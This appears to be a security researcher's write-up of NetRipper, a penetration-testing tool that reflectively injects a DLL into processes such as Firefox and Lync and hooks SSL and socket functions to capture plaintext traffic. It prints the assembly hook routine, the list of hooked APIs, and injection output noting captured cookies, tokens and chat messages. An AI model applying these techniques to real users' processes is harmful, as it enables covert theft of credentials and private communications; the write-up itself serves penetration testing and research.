# NetRipper: A Tool for Capturing Network Traffic

## Introduction
NetRipper is a tool designed to capture network traffic from applications by hooking into specific API functions. This document provides an overview of the core functionality, implementation challenges, and future work, as well as usage examples and conclusions.

## Core Hook Function
The core hook function restores the original bytes and redirects the code flow to a callback function. Here is the optimized and more readable version of the hook function:

```cpp
// Our "naked" hook function
extern "C" __declspec(naked) void Hook()
{
    __asm
    {
        // Get the address of the hooked function
        mov EAX, [ESP]           // Get EIP_CALLING
        sub EAX, 5               // Subtract the size of the call instruction

        // Get and parse the HookStruct
        push EAX                 // Pass the function parameter
        call Hooker::GetHookStructByOriginalAddress  // Call the function
        add ESP, 4               // Clean the stack (cdecl)
        push EAX                 // Backup the register

        // Retrieve data from the HookStruct
        mov EDX, [EAX + 4]       // EDX = m_OriginalAddress
        add EAX, 8               // EAX = m_OriginalBytes

        // Restore the original bytes
        push REPLACE_BYTES       // Size of the bytes to replace
        push EAX                 // m_OriginalBytes
        push EDX                 // m_OriginalAddress
        call DWORD PTR memcpy     // Restore the original bytes
        add ESP, 0xC             // Clean the stack
        pop EAX                  // Restore the register
        push EAX                 // Backup the register

        // Flush the instruction cache
        push REPLACE_BYTES       // Size of the bytes to flush
        mov EDX, [EAX + 4]       // EDX = m_OriginalAddress
        push EDX                 // m_OriginalAddress
        push 0xFFFFFFFF          // hProcess - current process (-1)
        call DWORD PTR [FlushInstructionCache]  // Flush the instruction cache
        pop EAX                  // Restore the register

        // Call the callback function
        add ESP, 4               // Remove EIP_Calling from the stack
        mov EDX, [EAX]           // Get the callback pointer
        jmp EDX                  // Jump to the callback function
    }
}
```

## Implementation Challenges
To ensure that NetRipper captures only unencrypted traffic, a "function flow flag" is used. This flag is set before saving data to a file. Each function checks this flag, and if it is not set, the function saves the captured data because it is the highest function in the flow. For example, the `PR_Write` callback function sets this flag. When it calls the original `PR_Write` function, which eventually calls the `send` function, the `send` function sees the flag set and does not save duplicate, encrypted data. After the original `PR_Write` returns, the `PR_Write` callback function unsets the flag. The flag is thread-based.

## Project Status and Future Work
Currently, NetRipper hooks the following functions:
- `PR_Read`/`PR_Write` from `nss3.dll`
- `PR_Send`/`PR_Recv` from `nspr4.dll`
- `SslEncryptPacket`/`SslDecryptPacket` from `ncrypt.dll`
- `send`/`recv` from `ws2_32.dll`
- `SSL_Send`/`SSL_Recv` from `chrome.dll`

It can capture network traffic from any application that uses these APIs to send or receive data over the network. We have successfully tested NetRipper with Microsoft Outlook, Microsoft Lync, Mozilla Firefox, Google Chrome, Internet Explorer, Yahoo! Messenger, and other popular Windows applications.

Future work includes:
- Hooking x64-based applications
- Adding more API functions to the hooking list (e.g., OpenSSL)
- Dynamically monitoring new processes and automatically loading into them
- Saving captured traffic in PCAP format
- Transmitting captured data through a TCP/UDP channel to a remote machine

## Similar Tools
We found two other tools capable of intercepting both plain-text and unencrypted network traffic: HookMe and EchoMirage. However, they both have graphical interfaces and are not suitable for penetration testing via command line or remote shell. In contrast, NetRipper is designed for penetration testers, works silently in the background, has a small footprint, and includes a Metasploit post-exploitation module.

## Usage Example
To test NetRipper, use the following command:
```sh
C:\Users\Ionut\Desktop\NetRipper\Debug>NetRipper.exe DLL.dll firefox.exe
Trying to inject DLL.dll in firefox.exe
Reflective injected in: 1608
```
The captured data is saved by default in the TEMP directory (e.g., `C:\Users\*\AppData\Local\Temp\NetRipper`). For example, the output file `1608_firefox.exe_PR_Write.txt` may contain sensitive information such as authentication cookies or access tokens.

A similar test with Microsoft Lync:
```sh
C:\Users\Ionut\Desktop\NetRipper\Debug>NetRipper.exe DLL.dll lync.exe
Trying to inject DLL.dll in lync.exe
Reflective injected in: 5568
```
We were able to capture conversation messages sent through Lync in rich-text format.

## Conclusions
NetRipper is a powerful tool for capturing network traffic on a Windows machine with low privileges. It is particularly useful for penetration testing but can also be used by legitimate users to monitor and investigate network traffic made by various software applications. Additionally, NetRipper can be used for malware analysis and investigation.

## Author Bio
**Ionut Popescu** is the author of NetRipper and works as a Senior Security Consultant (Penetration Tester) at KPMG Romania. He is passionate about ASM, reverse engineering, shellcode, and exploit development and holds a MCTS Windows Internals certification. Ionut has spoken at various security conferences and has written multiple papers and tutorials. He is also the main administrator of the largest Romanian IT security community, rstforums.com, and writes technical articles on KPMG team’s blog, securitycafe.ro.

## References
1. Stephen Fewer, “Reflective DLL Injection”  
   https://github.com/stephenfewer/ReflectiveDLLInjection
2. Stephen Fewer, “LoadLibraryR.c”  
   https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/inject/src/LoadLibraryR.c
3. Manuel Fernandez, “HookMe” project  
   https://code.google.com/p/hookme/
4. BindShell/WildCroftSecurity, “EchoMirage” project  
   http://www.wildcroftsecurity.com/echo-mirage
5. Ionut Popescu, “PE File Format, DLL Injection and API Hooking”  
   https://rstforums.com/proiecte/Licenta.docx
6. Ionut Popescu, “Stack Based Buffer Overflow”  
   http://www.exploit-db.com/docs/34304.pdf
7. Ionut Popescu, “Download & Load (DLL) shellcode”  
   https://rstforums.com/forum/87849-rst-shellcode-download-load-dll.rst
8. Ionut Popescu, “Upgrade your DLL to Reflective DLL”  
   http://securitycafe.ro/2015/02/26/upgrade-your-dll-to-reflective-dll/
9. Ionut Popescu, “Intercepting functions from statically linked libraries”  
   http://securitycafe.ro/2015/01/28/intercepting-functions-from-statically-linked-libraries/
10. Ionut Popescu, “How to intercept traffic from Java applications”  
    http://securitycafe.ro/2014/12/19/how-to-intercept-traffic-from-java-applications/